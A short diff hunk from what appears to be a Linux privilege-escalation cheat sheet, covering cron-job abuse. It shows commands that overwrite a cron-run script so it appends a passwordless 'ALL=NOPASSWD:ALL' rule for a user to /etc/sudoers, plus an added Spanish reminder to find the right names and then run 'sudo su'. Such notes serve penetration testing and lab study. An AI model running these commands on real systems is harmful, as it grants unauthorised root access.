@@ -1076,7 +1076,8 @@ crontab -l
 
 find / -name <CRONJOB_SCRIPT>
 
-printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
+printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>   -------> CUIDADO CON USER Y CRONJOB_SCRIPT, HAY QUE BUSCARLOS BIEN Y AL EJECUTAR HACER SUDO SU PARA NO TENER PASS EN ROOT
+
 ```
 
 #### SUID
